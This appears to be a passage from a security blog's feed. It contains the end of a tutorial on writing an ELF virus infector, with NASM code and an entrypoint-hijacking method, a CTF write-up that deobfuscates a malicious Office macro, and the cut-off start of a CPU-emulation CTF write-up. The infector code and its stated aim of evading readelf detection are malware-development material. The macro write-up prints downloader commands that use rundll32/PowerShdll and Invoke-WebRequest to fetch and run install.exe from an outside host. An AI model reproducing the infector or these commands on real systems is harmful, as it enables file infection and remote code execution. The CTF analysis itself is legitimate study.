&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;close_quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    signature: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, SIGNATURE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir1: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir2: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test2/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cwd: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_end:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_EXIT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once our new segment has been created, it is time to put the code inside the file. Since we are working with a memory mapped file, we need to remap it to extend it first. Once this has been done, we just go to the previous end of the file and we copy the payload there. To get the size of our payload, we use the &lt;code&gt;_end&lt;/code&gt; beacon that we put at the end so that we can define &lt;code&gt;virus_len&lt;/code&gt; as &lt;code&gt;_end - _start&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once our payload has been copied, the last step is to hijack the control flow to get it executed. To do that we will first add the following lines to &lt;code&gt;_start&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     _end
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;final_jmp_offset&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt; equ&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; _start
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this line, the program will cleanly quits after its first execution. We can also use this &lt;code&gt;jmp&lt;/code&gt; to jmp back to the original entrypoint after the virus execution. In x86_64 assembly, a jump is encoded as &lt;code&gt;opcode relative_offset&lt;/code&gt; starting from the &lt;code&gt;final_jmp_offset&lt;/code&gt; label.
We can obtain this offset with the formula : &lt;code&gt;old_entrypoint_address - final_jmp_offset&lt;/code&gt;.
Once we replaced the jmp address in the copied code, everything is set but there is still one thing to do for the infector to fully work : preserve its registers.
Indeed, the host program code might expect some special values in some register that we used (like &lt;code&gt;argc&lt;/code&gt; and &lt;code&gt;argv&lt;/code&gt; in &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt;) so we will push those important registers at the very beginning of our program and pop them just before the final jump.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;We can now infect any ELF 64-bits of our system and get anything executed executed by it if we insert a real payload inside but we have a problem : our technique is not stealthy at all, we can be spotted by &lt;code&gt;readelf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readelf&lt;/code&gt; is a linux command that allows us to inspect ELF files, we will use it with the &lt;code&gt;-l&lt;/code&gt; option to display the program headers of a simple Hello World coded in C before and after infection.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
Entry point 0x1050
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is how a normal file looks like, it has 4 load segments including a single one that is executable for the code and a single one that is writable for the data segment. It also has a NOTE header that is containing notes about the program.&lt;/p&gt;
&lt;p&gt;After the infection, it will look more like :&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
Entry point 0x70e0
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  LOAD           0x00000000000040e0 0x00000000000070e0 0x00000000000070e0
                 0x000000000000038a 0x000000000000038a  R E    0x1000
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can now see that there is another load segment which has execution permissions. It is super weird and should not be there at all, we can also notice that obviously, the NOTE segment disappeared. Another odd thing is the fact that the entrypoint is pointing on that segment. The code segment is almost always mapped at 0x1000 and the entrypoint is usually at the beginning of it so 0x70e0 definitely doesn&amp;rsquo;t look legit.
This is how you can see that this file is not legitimate and probably infected without even the need to properly analyze it.&lt;/p&gt;
&lt;p&gt;Lucky for us, we are gonna learn how to make an infector that will not induce any peculiar change in the ELF file structure. It will keep the original entrypoint and it will not change the number of load segments nor their permissions.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced&#34;&gt;Part 2. Advanced infectors: How to make our infector stealthy and hardly detectable&lt;/a&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>New Era - [HTB UNICTF 2021 - Finals]</title>
      <link>https://alagroy-42.github.io/writeups/new_era/</link>
      <pubDate>Tue, 14 Jun 2022 18:39:26 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/new_era/</guid>
      <description>The Challenge For this challenge we had an ISO file that contains this Office document.
We are gonna use the oletool suite to try to see if there is anything suspicious in that file.
The oledump utility shows us that there are macros that appear suspicious. We are gonna use the olevba utility to get more infos on the macros
That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had an ISO file that contains &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/office.doc&#34;&gt;this Office document&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We are gonna use the &lt;code&gt;oletool&lt;/code&gt; suite to try to see if there is anything suspicious in that file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_oledump.png&#34; alt=&#34;oledump&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;oledump&lt;/code&gt; utility shows us that there are macros that appear suspicious.
We are gonna use the &lt;code&gt;olevba&lt;/code&gt; utility to get more infos on the macros&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_olevba.png&#34; alt=&#34;olevba&#34;&gt;&lt;/p&gt;
&lt;p&gt;That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code. The problem is that it&amp;rsquo;s been compiled into assembly so we don&amp;rsquo;t have a direct access to the VBA. We are gonna use a utility called &lt;code&gt;pcode2code&lt;/code&gt; to transform back the pcode into human-readable VBA which gives us &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/raw_macro.vba&#34;&gt;this file&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Good news is that this is human readable-code, bad news is that it is completely obfuscated. So our main task will be to deobfuscate it.
We can notice a lot of code chunks using the &lt;code&gt;Chr&lt;/code&gt; function that converts a number to a char so we can guess that those are hidden strings. By simply copying those in a python file and renaming &lt;code&gt;Chr&lt;/code&gt; to &lt;code&gt;chr&lt;/code&gt; plus a few minor modifications, we can retrieve them and replace them in the original code.
For example :
&lt;code&gt;td.RegistrationInfo.Author = SazX46jj(&amp;quot;m&amp;quot; &amp;amp; Chr(int(&amp;quot;&amp;amp;H4f&amp;quot;)) &amp;amp; Chr(-878 + 958) &amp;amp; Chr(&amp;amp;H32) &amp;amp; &amp;quot;U&amp;quot; &amp;amp; Chr(75) &amp;amp; Chr(-2899 + 3012) &amp;amp; Chr(int(&amp;quot;55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;47&amp;quot;)) &amp;amp; Chr(2158 - 2109) &amp;amp; Chr(int(&amp;quot;&amp;amp;H52&amp;quot;)) &amp;amp; Chr(1501 - 1390) &amp;amp; Chr(int(&amp;quot;112&amp;quot;)) &amp;amp; Chr(476 - 360) &amp;amp; Chr(-1634 + 1716) &amp;amp; Chr(int(&amp;quot;71&amp;quot;)) &amp;amp; Chr(113) &amp;amp; Chr(&amp;amp;H76) &amp;amp; Chr(int(&amp;quot;106&amp;quot;)) &amp;amp; Chr(99) &amp;amp; Chr(int(&amp;quot;&amp;amp;H55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H75&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H43&amp;quot;)) &amp;amp; Chr(&amp;amp;H30) &amp;amp; Chr(47) &amp;amp; Chr(int(&amp;quot;&amp;amp;H46&amp;quot;)) &amp;amp; Chr(88) &amp;amp; Chr(8301 - 8247) &amp;amp; Chr(&amp;amp;H2B) &amp;amp; Chr(int(&amp;quot;108&amp;quot;)) &amp;amp; &amp;quot;9&amp;quot; &amp;amp; Chr(&amp;amp;H64))&lt;/code&gt;
will now be :
&lt;code&gt;td.RegistrationInfo.Author = deobf_str(&amp;quot;mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Every encoded string seems to be another base64 string but they also don&amp;rsquo;t decode into anything readable. However, we can notice that each of the base64-like strings are given to the same function that we will name &lt;code&gt;deobf_str&lt;/code&gt;. That gives us the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_1.vba&#34;&gt;stage_1&lt;/a&gt; file that is partially decoded.
After trying to understand how the script works, we got the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_2.vba&#34;&gt;stage_2&lt;/a&gt; file that has its symbols renamed with a coherent name and also more coherent types.&lt;/p&gt;
&lt;p&gt;Now that we have an approximation of what the &lt;code&gt;deobf_str&lt;/code&gt; function does, we will recode it in Python and try to get see what is hidden in the Base64-like strings.
Here is the corresponding script :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;deobfuscate.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from curses.ascii import isdigit, islower, isupper
import sys

def binary_transform1(elem, op):
    out = elem
    if op &amp;gt; 0:
        if elem &amp;gt; 0:
            out = int(out / (2 ** op))
        else:
            if op &amp;gt; 31:
                out = 0
            else:
                out = out &amp;amp; 0x7FFFFFFF
                out = int(out / (2 ** op))
                out = out | (2 ** (31 - op))
    return out

def binary_transform2(elem, op):
    out = elem
    if op &amp;gt; 0:
        for i in range(op):
            m = out &amp;amp; 0x40000000
            out = (out &amp;amp; 0x3FFFFFFF) * 2
            if m != 0:
                out = out | 0x80000000
    return out

def binary_transform3(setup):
    d1 = 7
    d2 = 14
    t = ((setup ^ binary_transform1(setup, d2)) &amp;amp; 52428)
    u = setup ^ t ^ binary_transform2(t, d2)
    t = (u ^ binary_transform1(u, d1)) &amp;amp; 5570645
    out = (u ^ t ^ binary_transform2(t, d1))
    return out

def crypto_style_mega_binary_transform(pre_final_result):
    return_value = &amp;#34;&amp;#34;
    for i in range(len(pre_final_result)):
        fr = i * 4
        if fr &amp;#43; 3&amp;gt;= len(pre_final_result):
            break
        setup = 0
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 3], 24)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 2], 16)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 1], 8)
        setup |= pre_final_result[fr]
        raw = binary_transform3(setup)
        a = chr(binary_transform1(raw &amp;amp; 0xff000000, 24))
        B = chr(binary_transform1(raw &amp;amp; 16711680, 16))
        c = chr(binary_transform1(raw &amp;amp; 65280, 8))
        d = chr(binary_transform1(raw &amp;amp; 255, 0))
        return_value = return_value &amp;#43; d &amp;#43; c &amp;#43; B &amp;#43; a
    return return_value



matrix = [0] * 256
arr1 = [0] * 64
arr2 = [0] * 64
arr3 = [0] * 64

for i in range (256):
    if isupper(i):
        matrix[i] = i - 65
    elif islower(i):
        matrix[i] = i - 71
    elif isdigit(i):
        matrix[i] = i &amp;#43; 4
    elif i == ord(&amp;#34;&amp;#43;&amp;#34;):
        matrix[i] = ord(&amp;#34;&amp;gt;&amp;#34;)
    elif i == ord(&amp;#34;/&amp;#34;):
        matrix[i] = ord(&amp;#34;?&amp;#34;)

for i in range(64):
    arr1[i] = i * 64
    arr2[i] = i * 64 * 64
    arr3[i] = i * 64 * 64 * 64

arg_str = sys.argv[1]
pre_final_result = [0] * (int((len(arg_str) &amp;#43; 1) / 4) * 3)
index_pre_final_result = 0

arg_str_array = [ord(i) for i in arg_str]

for iter in range(0, len(arg_str_array), 4):
    mega_byte = arr3[matrix[arg_str_array[iter]]] &amp;#43; arr2[matrix[arg_str_array[iter &amp;#43; 1]]] &amp;#43; arr1[matrix[arg_str_array[iter &amp;#43; 2]]] &amp;#43; matrix[arg_str_array[iter &amp;#43; 3]]
    i = mega_byte &amp;amp; 0xff0000
    pre_final_result[index_pre_final_result] = int(i / 0x10000)
    i = mega_byte &amp;amp; 0xff00
    pre_final_result[index_pre_final_result &amp;#43; 1] = int(i / 0x100)
    pre_final_result[index_pre_final_result &amp;#43; 2] = mega_byte &amp;amp; 0xff
    index_pre_final_result &amp;#43;= 3

deobf_str = crypto_style_mega_binary_transform(pre_final_result).strip(&amp;#34;~&amp;#34;)
print(deobf_str)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We will give each string to that script and try to see what they are corresponding to :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;strs.sh&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
/usr/local/bin/python3 deobfuscate.py &amp;#34;oPhSWfo8/Qbyq3BYqC59Urpr&amp;#43;lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho&amp;#43;1GqWpxDsK7wUappuFOi&amp;#43;/dR0qhwVvCqU0U=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy&amp;#43;Ndkq9YVPjYXV0=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK&amp;#43;AjSNlJT&amp;#43;HL8XA==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;gqV5VqC/WFWi28dQuqfQVg==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mOP2UKq7/1RoptRGqvjcUuC0/FX6&amp;#43;l9d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04&amp;#43;lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY&amp;#43;FdSAPzfRsjr51nyJHFZ&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;qlBUCugWcgwi2FUKulBVCupQV04=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;uK/UVug&amp;#43;OVDY&amp;#43;l1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mqt4Vqqz8xmAvnBS6OtcXw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ&amp;#43;vh9Xw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ivPlUuC4dhzSqPBW&amp;#43;PpfXQ==&amp;#34;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  forensics_newera sh strs
https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dl
C:\Windows\System32\rundll32.exe 
\powershdll.dll,main . { Invoke-WebRequest -useb https://windowsliveupdater.com/install.exe -OutFile 
C:\ProgramData\windows\install.exe
; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
Schedule.Service
Microsoft Corporation
cGFydDIgPSAiYnV0X3AwdzNyc2gzbGxfdzF0aDB1dF9wMHczcnNoM2xsXzFzX2MwMGwzcn0i
2022-02-22T22:22:22
tigger.ID
C:\ProgramData\windows\install.exe
Windows Update
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2:Win32_Process
WScript.Shell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That definetly looks like a shady macro and there is a particularly peculiar string in those which is&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once decoded, the base64 string gives us &lt;code&gt;part1 = &amp;quot;HTB{sch3dul1ng_t4sks_1s_c00l_&amp;quot;&lt;/code&gt;. We guess that the second part is in the other base64 string which gives us, once decoded : &lt;code&gt;part2 = &amp;quot;but_p0w3rsh3ll_w1th0ut_p0w3rsh3ll_1s_c00l3r}&amp;quot;&lt;/code&gt;. We now have the full flag.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Mechanical Madness - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/mechanical_madness/</link>
      <pubDate>Tue, 14 Jun 2022 15:42:52 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/mechanical_madness/</guid>
      <description>The Challenge For this challenge we had the following files :
cpu.circ (A very big XML file that describe the processor) nasm program.asm v2.0 raw 10000a 100101 10100 130000 100101 e0000 40000 nasm program.asm :start movl ax, 10 :sub1 movl bx, 1 sub bx cmp ax, ax movl bx, :sub1 jnz rst nasm program.asm :start movl cx, 10 clr movl bx, 1 movl dx, 0 mmiv 0x0, dx movl bx, :sub4 call bx, 0 mmov ax, 0x0 movl bx, :sub5 call bx, 0 :sub1 movl bx, 1 movl dx, 0 push dx, 0 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub1 jnz movl bx, :sub4 call bx, 0 :sub2 movl bx, 0 mmiv 0x1, bx mmiv 0x2, bx :sub3 pop ax, 0 movl bx, 1 movl dx, 0 movl bx, :sub5 call bx, 0 mmov bx, 0x1 msk mmiv 0x1, bx mmov bx, 0x2 mskb mmiv 0x2, bx movl ax, 0xff cmp bx, ax movl bx, :sub3 jl movl bx, 0 mmov dx, 0x1 movl cx, 1 movl cx, 0 movl bx, :sub2 jmp bx, 0 :sub4 movl ax, 0x05 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub4&amp;#43;1 jnz ret :sub5 movl cx, 4 movl cx, 0 ret Processor Analysis Once we open the cpu.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had the following files :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/writeups/mechanical_madness/cpu.circ.xml&#34;&gt;cpu.circ&lt;/a&gt; (A very big XML file that describe the processor)



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
v2.0 raw
10000a 100101 10100 130000 100101 e0000 40000 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl ax, 10
:sub1
	movl bx, 1
	sub  bx
	cmp  ax,  ax
	movl bx,  :sub1
	jnz
	rst
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
